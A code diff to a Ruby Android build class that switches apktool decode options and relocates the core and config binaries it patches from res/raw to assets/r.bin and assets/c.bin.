@@ -24,10 +24,10 @@ class BuildAndroid < Build
     Dir[path('core.*.apk')].each do |d| 
       version = d.scan(/core.android.(.*).apk/).flatten.first
 
-      CrossPlatform.exec "java", "-jar #{apktool} d -s #{d} #{@tmpdir}/apk.#{version}"
+      CrossPlatform.exec "java", "-jar #{apktool} d -s -r #{d} #{@tmpdir}/apk.#{version}"
       
-      if File.exist?(path("apk.#{version}/res/raw/resources.bin"))
-        @outputs << ["apk.#{version}/res/raw/resources.bin", "apk.#{version}/res/raw/config.bin"]
+      if File.exist?(path("apk.#{version}/assets/r.bin"))
+        @outputs << ["apk.#{version}/assets/r.bin", "apk.#{version}/assets/c.bin"]
       else
         raise "unpack failed. needed file not found"
       end
@@ -46,8 +46,8 @@ class BuildAndroid < Build
 
       # add the file to be patched to the params
       # these params will be passed to the super
-      params[:core] = "apk.#{version}/res/raw/resources.bin"
-      params[:config] = "apk.#{version}/res/raw/config.bin"
+      params[:core] = "apk.#{version}/assets/r.bin"
+      params[:config] = "apk.#{version}/assets/c.bin"
       
       # invoke the generic patch method with the new params
       super
@@ -148,11 +148,11 @@ class BuildAndroid < Build
     Dir[path('core.*.apk')].each do |apk|
       version = apk.scan(/core.android.(.*).apk/).flatten.first
 
-      CrossPlatform.exec "java", "-jar #{apktool} d -s #{apk} #{@tmpdir}/apk.#{version}"
+      CrossPlatform.exec "java", "-jar #{apktool} d -s -r #{apk} #{@tmpdir}/apk.#{version}"
 
-      core_content = File.open(path("apk.#{version}/res/raw/resources.bin"), "rb") { |f| f.read }
+      core_content = File.open(path("apk.#{version}/assets/r.bin"), "rb") { |f| f.read }
       add_magic(core_content)
-      File.open(path("apk.#{version}/res/raw/resources.bin"), "wb") { |f| f.write core_content }
+      File.open(path("apk.#{version}/assets/r.bin"), "wb") { |f| f.write core_content }
 
       FileUtils.rm_rf apk
 
